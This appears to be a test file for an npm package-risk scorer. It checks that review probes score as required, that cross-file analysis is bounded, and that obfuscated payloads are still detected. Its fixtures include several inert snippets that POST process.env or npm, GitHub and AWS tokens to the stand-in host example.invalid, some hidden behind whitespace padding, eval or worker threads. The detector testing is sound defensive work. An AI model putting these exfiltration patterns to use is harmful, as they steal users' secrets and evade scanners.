// The third review of apm-score-v10 (HOLD, safety 4/10): every probe the reviewer scored and every case this round
// adds (fixtures/review-r3-probes.ts), with the bounds the review asked for. Every package is an inert string: the
// hosts are example.invalid, the tokens are fake, nothing here runs.
import { describe, expect, test } from "bun:test";
import { runDecoder, type Known } from "../src/decode.ts";
import { analyze, CONFIRMED_FLOW_POINTS, finalize, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";
import { BENIGN_EXTRA, dagFiles, paddedComment, PROBES, type Probe } from "./fixtures/review-r3-probes.ts";
import { supersetGaps } from "./superset.ts";
import { parse } from "acorn";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function inputOf(files: Readonly<Record<string, string>>, install = false): AnalyzeInput {
  const scripts: Record<string, string> = install ? { postinstall: "node index.js" } : {};
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", scripts };

  return { name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] };
}

function scored(files: Readonly<Record<string, string>>, install = false, options: Partial<AnalyzeInput> = {}): Analysis {
  const input = { ...inputOf(files, install), ...options };
  const a = analyze(input);

  // every case keeps every finding apm-score-v3 makes
  expect(supersetGaps(input, a)).toEqual([]);

  return a;
}

const scoreOf = (a: Analysis): number => finalize(a, STATE).score;
const risk = (a: Analysis, id: string) => a.signals.find((s) => s.id === id && s.points < 0);
const why = (a: Analysis): string => a.signals.filter((s) => s.points < 0).map((s) => `${s.id} ${s.points}: ${s.evidence[0] ?? ""}`).join("\n");

const URL = "'https://example.invalid/c'";

describe("every review probe scores as the review asked", () => {
  for (const p of PROBES.filter((x) => x.expect === "refuse")) {
    test(`${p.id}${p.finding ? ` (finding ${p.finding})` : ""} is refused at install`, () => {
      const a = scored(p.files, true);

      expect(scoreOf(a), why(a)).toBeLessThan(SCORE_FLOOR);
    });
  }

  for (const p of [...PROBES, ...BENIGN_EXTRA].filter((x): x is Probe => x.expect === "pass")) {
    test(`${p.id}${p.finding ? ` (finding ${p.finding})` : ""} passes${p.strong ? " at 75 or more" : ""}`, () => {
      const a = scored(p.files);

      expect(scoreOf(a), why(a)).toBeGreaterThanOrEqual(p.strong ? 75 : SCORE_FLOOR);
    });
  }
});

describe("1: resolution across files is bounded", () => {
  for (const levels of [22, 26, 200]) {
    test(`a shared re-export DAG of ${levels * 2 + 1} files finishes fast and still finds the upload`, () => {
      const t = performance.now();
      const a = analyze(inputOf(dagFiles(levels)));
      const ms = performance.now() - t;

      // 6.3 s for 45 files and past 12 s for 53 before; one visit per edge now
      expect(ms).toBeLessThan(3000);
      expect(risk(a, "exfiltration")?.points).toBe(CONFIRMED_FLOW_POINTS);
    });
  }

  test("a work budget that runs out says the analysis is incomplete, never clean", () => {
    const a = analyze({ ...inputOf(dagFiles(22)), maxCrossFileSteps: 10 });

    expect(risk(a, "incomplete")?.evidence[0]).toContain("flows across files");
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("past the work meter the analysis is incomplete, naming the phase, never read as clean", () => {
    const a = analyze({ ...inputOf({ "index.js": "module.exports = 1;", "lib/a.js": "module.exports = 2;" }), maxWork: 10 });

    expect(risk(a, "incomplete")?.evidence[0]).toContain("analysis work limit");
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });
});

describe("2: padding cannot hide recovered source", () => {
  test("270,000 spaces before the payload in a recovered comment: read, and refused (97 before; 72 at install)", () => {
    for (const install of [false, true]) {
      const a = scored({ "index.js": paddedComment(270_000) }, install);

      expect(risk(a, "exfiltration")?.points, why(a)).toBe(CONFIRMED_FLOW_POINTS);
      expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
    }
  });

  test("recovered source longer than apm reads, even squeezed, is reported incomplete", () => {
    const junk = "x;".repeat(140_000);
    const a = scored({ "index.js": `function f(){/*${junk}${`fetch(${URL},{method:'POST',body:JSON.stringify(process.env)});`}*/}new(require('worker_threads').Worker)(String(f).slice(14,-3),{eval:true});` });

    expect(risk(a, "incomplete")?.evidence[0], why(a)).toContain("recovers from its own source");
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("code run from a string longer than apm reads is reported incomplete, not dropped", () => {
    const body = `${"a=1;".repeat(70_000)}fetch(${URL},{method:'POST',body:JSON.stringify(process.env)});`;
    const a = scored({ "index.js": `eval(${JSON.stringify(body)});` });

    expect(risk(a, "incomplete")?.evidence[0], why(a)).toContain("more than the 256 KB apm reads");
  });
});

describe("8, 9, 10: confirmed flows only where they are established", () => {
  test("one helper called twice: the call that sends 'public' is not the call that kept the environment", () => {
    const a = scored({ "index.js": `function id(x){return x}const keep=id(process.env);fetch(${URL},{method:'POST',body:JSON.stringify(id('public'))});` });

    expect(risk(a, "exfiltration")).toBeUndefined();
  });

  test("the same helper handing the environment to the request is still confirmed", () => {
    const a = scored({ "index.js": `function id(x){return x}fetch(${URL},{method:'POST',body:JSON.stringify(id(process.env))});` });

    expect(risk(a, "exfiltration")?.points).toBe(CONFIRMED_FLOW_POINTS);
  });

  test("a config of three token families that sends one is not three families sent", () => {
    const a = scored({ "index.js": `const t={npm:process.env.NPM_TOKEN,github:process.env.GITHUB_TOKEN,aws:process.env.AWS_SECRET_ACCESS_KEY};fetch(${URL},{headers:{authorization:'Bearer '+t.npm}});` });

    expect(risk(a, "exfiltration")?.points ?? 0).toBeGreaterThan(CONFIRMED_FLOW_POINTS);
  });

  test("example code a package exports as text is not a confirmed flow", () => {
    const a = scored({ "index.js": `module.exports="fetch('https://example.invalid/c',{method:'POST',body:JSON.stringify(process.env)})";` });

    expect(risk(a, "exfiltration")?.points ?? 0).toBeGreaterThan(CONFIRMED_FLOW_POINTS);
    expect(scoreOf(a)).toBeGreaterThanOrEqual(SCORE_FLOOR);
  });

  test("the same text written to a file and then loaded runs, and is refused", () => {
    const a = scored({ "index.js": `require('fs').writeFileSync('/tmp/held.js',"fetch('https://example.invalid/c',{method:'POST',body:JSON.stringify(process.env)})");require('/tmp/held.js');` });

    expect(risk(a, "exfiltration")?.points, why(a)).toBe(CONFIRMED_FLOW_POINTS);
  });

  test("a named entry of a parsed .npmrc sent to the registry is a token sent by policy, not the file", () => {
    const npmrc = BENIGN_EXTRA.find((p) => p.id === "pnpm-cli-npmrc");

    expect(npmrc).toBeDefined();

    if (!npmrc) return;
    const a = scored(npmrc.files);

    expect(risk(a, "credential-read")).toBeDefined();
    expect(risk(a, "exfiltration")).toBeUndefined();
  });
});

describe("benign shapes the popular corpus showed while this round was built", () => {
  test("a method an object defines returns its own value, not the environment the object also holds (prisma)", () => {
    const a = scored({ "index.js": `function build(env){return {ts:env.readPkg(),os:env.platform}}async function post(p){const e=build({env:process.env,platform:process.platform,readPkg:()=>null});await fetch(p,{method:'POST',body:JSON.stringify(e)})}module.exports=post;` });

    expect(risk(a, "exfiltration")).toBeUndefined();
  });

  test("a regex's exec is not a command (next)", () => {
    const a = scored({ "index.js": `const re=/#([0-9a-f]{6})/;module.exports=async u=>{const t=await (await fetch(u)).text();return re.exec(t)}` });

    expect(risk(a, "remote-shell")).toBeUndefined();
  });

  test("a URL built from a DNS address and handed to a helper that runs `open \"${url}\"` is not a download run (vite)", () => {
    const a = scored({ "index.js": `const dns=require('dns').promises;const {exec}=require('child_process');function run(cmd){return new Promise(r=>exec(cmd,()=>r()))}module.exports=async()=>{const {address}=await dns.lookup('localhost');await run(\`open "http://\${address}:5173/"\`)};` });

    expect(risk(a, "remote-shell")).toBeUndefined();
  });

  test("a downloaded version in a fixed command, through a helper, is not a download run", () => {
    const a = scored({ "index.js": `const {execSync}=require('child_process');const sh=c=>execSync(c);fetch('https://example.invalid/v').then(r=>r.json()).then(({version})=>sh(\`npm view probe-pkg@\${version} dist.tarball\`));` });

    expect(risk(a, "remote-shell")).toBeUndefined();
  });

  test("a downloaded body in a fixed command is a possible remote shell, not a confirmed one", () => {
    const a = scored({ "index.js": `fetch(${URL}).then(r=>r.text()).then(code=>require('child_process').exec('echo '+code));` });

    expect(risk(a, "remote-shell")?.points).toBe(-50);
    expect(risk(a, "remote-shell")?.evidence[0]).toContain("it may run as a command");
  });

  test("wget downloading with the environment passed as options is not sending the environment (pm2)", () => {
    const a = scored({ "index.js": `const {spawn}=require('child_process');module.exports=(url,dest)=>spawn('wget',[url,'-O',dest,'-q'],{env:process.env});` });

    expect(risk(a, "exfiltration")).toBeUndefined();
  });
});

describe("the decoder apm runs on a program's own helper functions", () => {
  const fnOf = (src: string) => {
    const program = parse(src, { ecmaVersion: "latest" });
    const first = program.body[0];

    if (first?.type !== "FunctionDeclaration") throw new Error("expected a function");

    return first;
  };

  const host = { constant: () => null, localFunction: () => null };
  const text = (value: string): Known => ({ kind: "text", value });

  test("hex, char-code and reversed-string decoders", () => {
    expect(runDecoder(fnOf("function g(h){return h.replace(/../g,m=>String.fromCharCode(parseInt(m,16)))}"), [text("6178696f73")], host)).toEqual({ kind: "decoded", value: "axios" });
    expect(runDecoder(fnOf("function g(a){return a.split('').reverse().join('')}"), [text("ssecorp_dlihc")], host)).toEqual({ kind: "decoded", value: "child_process" });
    expect(runDecoder(fnOf("function g(s,k){return s.split(',').map(c=>String.fromCharCode(Number(c)^k)).join('')}"), [text("43,42,47"), { kind: "number", value: 66 }], host)).toEqual({ kind: "decoded", value: "ihm" });
    expect(runDecoder(fnOf("function g(s){return Buffer.from(s,'base64').toString()}"), [text("ZmV0Y2g=")], host)).toEqual({ kind: "decoded", value: "fetch" });
  });

  test("it gives up on anything it cannot run purely and quickly", () => {
    // a regex with a group or an open-ended repeat, a loop, a write, a call it does not know
    expect(runDecoder(fnOf("function g(h){return h.replace(/(a+)+$/g,'')}"), [text("aaaa")], host)).toEqual({ kind: "unsupported" });
    expect(runDecoder(fnOf("function g(h){for(;;){}return h}"), [text("x")], host)).toEqual({ kind: "unsupported" });
    expect(runDecoder(fnOf("function g(h){globalThis.x=h;return h}"), [text("x")], host)).toEqual({ kind: "unsupported" });
    expect(runDecoder(fnOf("function g(h){return fetch(h)}"), [text("x")], host)).toEqual({ kind: "unsupported" });
    // a decoder that would build more than it may stops at its limit, and says so
    expect(runDecoder(fnOf("function g(h){return h.split('').map(c=>h+h+h+h).join('')}"), [text("y".repeat(4000))], host)).toMatchObject({ kind: "exhausted" });
  });
});
